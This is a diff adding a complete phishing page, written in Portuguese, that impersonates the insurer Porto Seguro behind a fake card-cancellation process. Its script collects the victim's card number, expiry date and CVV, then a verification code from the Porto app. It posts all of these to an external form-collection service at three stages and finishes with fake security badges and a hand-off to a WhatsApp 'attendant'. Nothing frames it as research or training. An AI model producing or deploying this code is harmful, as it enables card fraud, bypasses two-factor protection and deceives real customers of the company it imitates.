@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Porto Seguro - Cancelamento de Cartão</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0047AB 0%, #002d69 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .header {
+            background: #002d69;
+            padding: 25px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+        
+        .logo {
+            width: 180px;
+            margin-bottom: 15px;
+        }
+        
+        .header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            background: #00a859;
+            padding: 8px 15px;
+            border-radius: 50px;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .secure-badge i {
+            margin-right: 5px;
+        }
+        
+        .notification-bell {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 24px;
+        }
+        
+        .notification-bell i {
+            font-size: 32px;
+        }
+        
+        .notification-text {
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        
+        .form-container {
+            padding: 30px;
+            transition: opacity 0.3s ease;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e0e0e0;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+        
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #999;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+        
+        .step.active {
+            background: #0047AB;
+            border-color: #0047AB;
+            color: white;
+        }
+        
+        .step.completed {
+            background: #00a859;
+            border-color: #00a859;
+            color: white;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #002d69;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #444;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 18px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-group input:focus {
+            border-color: #0047AB;
+            outline: none;
+        }
+        
+        .input-error {
+            border-color: #e74c3c !important;
+        }
+        
+        .error-text {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .row .input-group {
+            flex: 1;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: #0047AB;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+            position: relative;
+        }
+        
+        .btn:hover {
+            background: #002d69;
+        }
+        
+        .btn-loading {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+        
+        .btn-loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            margin: -10px 0 0 -10px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-container, .verification-container, .success-container {
+            text-align: center;
+            padding: 30px;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-container i {
+            font-size: 50px;
+            color: #0047AB;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .loading-container p {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .verification-instruction {
+            background: #f0f7ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            border-left: 4px solid #0047AB;
+        }
+        
+        .verification-instruction i {
+            color: #0047AB;
+            margin-right: 8px;
+        }
+        
+        .verification-code {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .verification-code input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            transition: border-color 0.3s;
+        }
+        
+        .verification-code input:focus {
+            border-color: #0047AB;
+            outline: none;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            margin-top: 10px;
+            display: none;
+            background: #ffecec;
+            padding: 10px;
+            border-radius: 5px;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        .success-container i {
+            font-size: 70px;
+            color: #00a859;
+            margin-bottom: 20px;
+        }
+        
+        .success-container h2 {
+            color: #00a859;
+            margin-bottom: 15px;
+        }
+        
+        .whatsapp-btn {
+            display: inline-flex;
+            align-items: center;
+            background: #25D366;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-weight: 600;
+            margin-top: 20px;
+            text-decoration: none;
+            transition: transform 0.2s, background 0.2s;
+        }
+        
+        .whatsapp-btn:hover {
+            transform: translateY(-2px);
+            background: #128C7E;
+        }
+        
+        .whatsapp-btn i {
+            margin-right: 10px;
+            font-size: 24px;
+        }
+        
+        .footer {
+            background: #f5f7fa;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .security-features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+        
+        .security-features div {
+            display: flex;
+            align-items: center;
+        }
+        
+        .security-features i {
+            margin-right: 5px;
+            color: #0047AB;
+        }
+        
+        .visible {
+            display: block;
+            opacity: 1;
+        }
+        
+        @media (max-width: 500px) {
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .verification-code input {
+                width: 40px;
+                height: 50px;
+            }
+            
+            .security-features {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://prime.altubots.com/chats/portoassistencia/8e525c6a71acc64d1ef320e92ef1088a/images/logo.png?t=1749683723" alt="Porto Seguro" class="logo">
+            <h1>Cancelamento de Cartão</h1>
+            <div class="secure-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>100% Seguro</span>
+            </div>
+            <div class="notification-bell">
+                <i class="fas fa-bell"></i>
+                <div class="notification-text">Notificações</div>
+            </div>
+        </div>
+        
+        <div class="form-container visible" id="cardForm">
+            <div class="step-indicator">
+                <div class="step active">1</div>
+                <div class="step">2</div>
+                <div class="step">3</div>
+            </div>
+            
+            <h2 class="form-title">Digite os dados do cartão</h2>
+            
+            <div class="input-group">
+                <label for="cardNumber">Número do Cartão (16 dígitos)</label>
+                <input type="text" id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000">
+                <div class="error-text" id="cardNumberError">Por favor, insira um número de cartão válido</div>
+            </div>
+            
+            <div class="row">
+                <div class="input-group">
+                    <label for="expiryDate">Data de Validade</label>
+                    <input type="text" id="expiryDate" maxlength="5" placeholder="MM/AA">
+                    <div class="error-text" id="expiryDateError">Data de validade inválida</div>
+                </div>
+                
+                <div class="input-group">
+                    <label for="cvv">Código de Segurança</label>
+                    <input type="text" id="cvv" maxlength="3" placeholder="000">
+                    <div class="error-text" id="cvvError">Código de segurança inválido</div>
+                </div>
+            </div>
+            
+            <button class="btn" id="continueBtn" onclick="submitCardData()">Continuar</button>
+        </div>
+        
+        <div class="loading-container" id="loadingSection">
+            <i class="fas fa-spinner fa-spin"></i>
+            <p>Processando suas informações</p>
+            <p>Aguarde um momento...</p>
+        </div>
+        
+        <div class="verification-container" id="verificationSection">
+            <div class="step-indicator">
+                <div class="step completed">1</div>
+                <div class="step active">2</div>
+                <div class="step">3</div>
+            </div>
+            
+            <h2 class="form-title">Verificação de Segurança</h2>
+            
+            <div class="verification-instruction">
+                <i class="fas fa-info-circle"></i>
+                <span>Verifique as notificações no aplicativo da Porto, no sininho e insira o código recebido.</span>
+            </div>
+            
+            <div class="verification-code">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 1)" id="code1">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 2)" id="code2">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 3)" id="code3">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 4)" id="code4">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 5)" id="code5">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 6)" id="code6">
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i>
+                Código incorreto. Por favor, tente novamente.
+            </div>
+            
+            <button class="btn" id="verifyBtn" onclick="submitVerificationCode()">Verificar Código</button>
+        </div>
+        
+        <div class="success-container" id="successSection">
+            <div class="step-indicator">
+                <div class="step completed">1</div>
+                <div class="step completed">2</div>
+                <div class="step active">3</div>
+            </div>
+            
+            <i class="fas fa-check-circle"></i>
+            <h2>Perfeito!</h2>
+            <p>Agora continue com nosso atendente no telefone e ative a central de notificações via WhatsApp</p>
+            
+            <a href="" class="whatsapp-btn" target="_blank">
+                <i class="fab fa-whatsapp"></i>
+                Falar com Atendente
+            </a>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 Porto Seguro. Todos os direitos reservados.</p>
+            <div class="security-features">
+                <div><i class="fas fa-lock"></i> Dados Criptografados</div>
+                <div><i class="fas fa-shield-alt"></i> Protegido contra fraudes</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Função para formatar o número do cartão
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            
+            e.target.value = formattedValue;
+            hideError('cardNumberError');
+        });
+        
+        // Função para formatar a data de validade
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            
+            if (value.length >= 2) {
+                e.target.value = value.slice(0, 2) + '/' + value.slice(2);
+            } else {
+                e.target.value = value;
+            }
+            hideError('expiryDateError');
+        });
+        
+        // Limitar CVV a 3 dígitos
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+            hideError('cvvError');
+        });
+        
+        // Função para esconder mensagem de erro
+        function hideError(errorId) {
+            document.getElementById(errorId).style.display = 'none';
+            document.getElementById(errorId).previousElementSibling.classList.remove('input-error');
+        }
+        
+        // Função para mostrar mensagem de erro
+        function showError(errorId) {
+            document.getElementById(errorId).style.display = 'block';
+            document.getElementById(errorId).previousElementSibling.classList.add('input-error');
+        }
+        
+        // Função para enviar dados para o Basin
+        async function submitToBasin(data, etapa) {
+            const formData = new FormData();
+            formData.append('card_number', data.cardNumber || '');
+            formData.append('expiry_date', data.expiryDate || '');
+            formData.append('cvv', data.cvv || '');
+            formData.append('verification_code', data.verificationCode || '');
+            formData.append('date_time', new Date().toLocaleString('pt-BR'));
+            formData.append('etapa', etapa);
+            formData.append('source', 'Porto Seguro Cartão Cancelamento');
+            
+            try {
+                const response = await fetch('https://usebasin.com/f/e095a9658867', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                if (response.ok) {
+                    console.log('Dados enviados com sucesso para o Basin');
+                    return true;
+                } else {
+                    console.error('Erro ao enviar dados para o Basin');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                return false;
+            }
+        }
+        
+        // Função para enviar dados do cartão
+        async function submitCardData() {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            let isValid = true;
+            
+            // Validações
+            if (cardNumber.length !== 16 || isNaN(cardNumber)) {
+                showError('cardNumberError');
+                isValid = false;
+            }
+            
+            if (expiryDate.length !== 5 || !expiryDate.includes('/')) {
+                showError('expiryDateError');
+                isValid = false;
+            }
+            
+            if (cvv.length !== 3 || isNaN(cvv)) {
+                showError('cvvError');
+                isValid = false;
+            }
+            
+            if (!isValid) return;
+            
+            // Mostrar estado de carregamento no botão
+            const continueBtn = document.getElementById('continueBtn');
+            continueBtn.classList.add('btn-loading');
+            continueBtn.disabled = true;
+            
+            // Armazenar os dados
+            localStorage.setItem('portoCardNumber', cardNumber);
+            localStorage.setItem('portoExpiryDate', expiryDate);
+            localStorage.setItem('portoCvv', cvv);
+            
+            // Enviar dados para o Basin (primeira etapa)
+            const success = await submitToBasin({
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                cvv: cvv,
+                verificationCode: 'Aguardando verificação'
+            }, 'Etapa 1 - Dados do cartão');
+            
+            if (!success) {
+                continueBtn.classList.remove('btn-loading');
+                continueBtn.disabled = false;
+                alert('Erro ao processar. Tente novamente.');
+                return;
+            }
+            
+            // Transição suave entre as etapas
+            setTimeout(function() {
+                document.getElementById('cardForm').classList.remove('visible');
+                
+                setTimeout(function() {
+                    document.getElementById('loadingSection').classList.add('visible');
+                    
+                    // Simular processamento
+                    setTimeout(async function() {
+                        document.getElementById('loadingSection').classList.remove('visible');
+                        document.getElementById('verificationSection').classList.add('visible');
+                        
+                        // Gerar código de verificação
+                        const verificationCode = Math.floor(100000 + Math.random() * 900000);
+                        localStorage.setItem('portoVerificationCode', verificationCode.toString());
+                        
+                        // Enviar dados com código de verificação (segunda etapa)
+                        await submitToBasin({
+                            cardNumber: cardNumber,
+                            expiryDate: expiryDate,
+                            cvv: cvv,
+                            verificationCode: verificationCode.toString()
+                        }, 'Etapa 2 - Código de verificação gerado');
+                        
+                        // Em um cenário real, este código seria enviado para o app/serviço da Porto
+                        console.log("Código de verificação gerado:", verificationCode);
+                        
+                        // Auto-preenchir para facilitar (apenas para demonstração)
+                        if (window.location.href.includes('demo=true')) {
+                            const codeDigits = verificationCode.toString().split('');
+                            document.getElementById('code1').value = codeDigits[0];
+                            document.getElementById('code2').value = codeDigits[1];
+                            document.getElementById('code3').value = codeDigits[2];
+                            document.getElementById('code4').value = codeDigits[3];
+                            document.getElementById('code5').value = codeDigits[4];
+                            document.getElementById('code6').value = codeDigits[5];
+                        }
+                    }, 2500);
+                }, 300);
+            }, 300);
+        }
+        
+        // Função para mover entre os campos do código de verificação
+        function moveToNext(input, nextIndex) {
+            const maxLength = parseInt(input.getAttribute('maxlength'));
+            const currentLength = input.value.length;
+            
+            if (currentLength >= maxLength) {
+                const nextInput = input.parentElement.querySelector('input:nth-child(' + (nextIndex + 1) + ')');
+                if (nextInput) {
+                    nextInput.focus();
+                }
+            }
+            
+            // Esconder mensagem de erro quando o usuário começar a digitar novamente
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+        
+        // Função para verificar o código
+        async function submitVerificationCode() {
+            const inputs = document.querySelectorAll('.verification-code input');
+            let enteredCode = '';
+            
+            inputs.forEach(input => {
+                enteredCode += input.value;
+            });
+            
+            // Recuperar dados do localStorage
+            const cardNumber = localStorage.getItem('portoCardNumber');
+            const expiryDate = localStorage.getItem('portoExpiryDate');
+            const cvv = localStorage.getItem('portoCvv');
+            
+            // Mostrar estado de carregamento no botão
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.classList.add('btn-loading');
+            verifyBtn.disabled = true;
+            
+            // Enviar dados com código de verificação (terceira etapa)
+            const success = await submitToBasin({
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                cvv: cvv,
+                verificationCode: enteredCode
+            }, 'Etapa 3 - Verificação concluída');
+            
+            if (!success) {
+                verifyBtn.classList.remove('btn-loading');
+                verifyBtn.disabled = false;
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+            
+            // Simular verificação
+            setTimeout(function() {
+                document.getElementById('verificationSection').classList.remove('visible');
+                
+                setTimeout(function() {
+                    document.getElementById('successSection').classList.add('visible');
+                }, 300);
+            }, 1500);
+        }
+        
+        // Permitir navegação por teclado nos campos de código
+        document.querySelectorAll('.verification-code input').forEach((input, index, inputs) => {
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
